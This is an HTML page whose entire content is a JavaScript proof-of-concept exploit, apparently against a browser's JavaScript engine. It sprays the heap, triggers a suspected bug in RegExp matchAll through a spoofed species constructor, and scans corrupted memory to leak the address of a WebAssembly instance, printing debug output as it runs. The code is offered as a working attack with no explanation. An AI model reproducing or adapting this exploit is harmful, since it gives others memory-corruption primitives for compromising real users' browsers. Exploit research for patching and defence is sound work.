<!doctype html><html><head><meta charset="utf-8"><title>P42</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function flo(f){f64[0]=f;return u32[0];}
function fhi(f){f64[0]=f;return u32[1];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
const marker={mmm:1};
const marker2={zzz:2};
const objB=new Array(0x8000);
for(var i=0;i<objB.length;i++)objB[i]=marker;
const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
objB[4]=wasmI; objB[5]=marker;
const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const c0=w2f(DMAP,EMPTY);
const sk=[];
log("UA: "+navigator.userAgent);
trash(230);trash(230);
objB[4]=wasmI;objB[5]=marker;
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
for(let r=0;r<3;r++){const c1=w2f(0x1080011,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));
if(Array.isArray(m)){
  log("L: "+m.length);
  // Phase 1: find marker_ptr (fast, small range)
  let MK=0;
  for(let k=0x8000;k<0x9000;k++){
    const lo=flo(m[k]),hi=fhi(m[k]);
    if(lo===hi&&(lo&1)&&lo>0x100000){MK=lo;break;}
  }
  if(!MK){log("NO_MK");log("W: "+wasmI.exports.f());log("=== DONE ===");throw 0;}
  log("MK:"+MK.toString(16));
  // Phase 2: FAST wide scan using Number ops (no BigInt!)
  // Look for wasmI transition: (MK,MK)(MK,MK)(X,MK) where X≠MK
  const cands=[];
  for(let k=0x8000;k<0x50000;k++){
    const lo=flo(m[k]),hi=fhi(m[k]);
    if(lo===MK&&hi===MK){
      const lo2=flo(m[k+1]),hi2=fhi(m[k+1]);
      if(lo2===MK&&hi2===MK){
        const lo3=flo(m[k+2]),hi3=fhi(m[k+2]);
        if(lo3!==MK&&(lo3&1)&&lo3>0x100&&hi3===MK){
          cands.push(k);
        }
        // Also check hi32 variant: (MK,X)(MK,MK) at k+1
        if(hi2!==MK&&(hi2&1)&&hi2>0x100){
          cands.push(-(k+1)); // negative = hi variant
        }
      }
    }
    if(cands.length>=6)break;
  }
  log("C:"+cands.length+" "+cands.map(x=>x.toString(16)).join(","));
  // Live test
  let live=-1;
  for(const c of cands){
    const k=Math.abs(c);
    const off=c<0?1:2; // which QWORD has the wasmI slot
    const b=f2i(m[k+off]);
    objB[4]=marker2;
    const a=f2i(m[k+off]);
    objB[4]=marker;
    // Also check k+off-1 and k+off+1
    const b1=f2i(m[k+1]);
    objB[4]=marker2;
    const a1=f2i(m[k+1]);
    objB[4]=marker;
    if(a!==b||a1!==b1){live=k;log("LIVE@"+k.toString(16)+" off="+off);break;}
  }
  if(live>=0){
    // Read wasmI ptr
    objB[4]=wasmI;
    const lo2=flo(m[live+2]),hi1=fhi(m[live+1]);
    objB[4]=marker;
    log("W_lo2:"+lo2.toString(16)+" W_hi1:"+hi1.toString(16));
    // Determine which is wasmI (the one that != MK)
    const wp=(lo2!==MK&&(lo2&1))?lo2:hi1;
    log("WP:"+wp.toString(16)+" ODD:"+(wp&1));
  }else{log("ALL_DEAD");}
  log("W: "+wasmI.exports.f());
}else{log("NA");}
}catch(e){if(e!==0)log("E: "+e.message);}
log("=== DONE ===");
</script></body></html>
